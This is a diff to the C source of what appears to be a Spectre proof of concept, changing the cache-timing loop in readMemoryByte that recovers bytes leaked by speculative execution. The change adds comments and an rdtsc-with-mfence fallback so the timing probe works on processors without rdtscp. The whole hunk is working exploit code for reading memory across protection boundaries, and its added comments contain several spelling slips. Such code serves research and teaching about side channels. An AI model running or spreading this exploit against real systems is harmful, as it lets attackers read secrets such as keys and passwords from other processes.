@@ -120,14 +120,55 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
     for (i = 0; i < 256; i++) {
       mix_i = ((i * 167) + 13) & 255;
       addr = & array2[mix_i * 512];
+
+    /*
+    We need to accuratly measure the memory access to the current index of the
+    array so we can determine which index was cached by the malicious mispredicted code.
+
+    The best way to do this is to use the rdtscp instruction, which measures current
+    processor ticks, and is also serialized.
+    */
+
 #ifndef NORDTSCP
       time1 = __rdtscp( & junk); /* READ TIMER */
       junk = * addr; /* MEMORY ACCESS TO TIME */
       time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
 #else
+
+    /*
+    The rdtscp instruction was instroduced with the x86-64 extensions.
+    Many older 32-bit processors won't support this, so we need to use
+    the equivalent but non-serialized tdtsc instruction instead.
+    */
+
+#ifndef NOMFENCE
+      /*
+      Since the rdstc instruction isn't serialized, newer processors will try to
+      reorder it, ruining its value as a timing mechanism.
+      To get around this, we use the mfence instruction to introduce a memory
+      barrier and force serialization. mfence is used because it is portable across
+      Intel and AMD.
+      */
+
+      _mm_mfence();
+      time1 = __rdtsc(); /* READ TIMER */
+      _mm_mfence();
+      junk = * addr; /* MEMORY ACCESS TO TIME */
+      _mm_mfence();
+      time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
+      _mm_mfence();
+#else
+      /*
+      The mfence instruction was introduced with the SSE2 instruction set, so
+      we have to ifdef it out on pre-SSE2 processors.
+      Luckily, these older processors don't seem to reorder the rdtsc instruction,
+      so not having mfence on older processors is less of an issue.
+      */
+
       time1 = __rdtsc(); /* READ TIMER */
       junk = * addr; /* MEMORY ACCESS TO TIME */
       time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
+#endif
 #endif
       if (time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
         results[mix_i]++; /* cache hit - add +1 to score for this value */
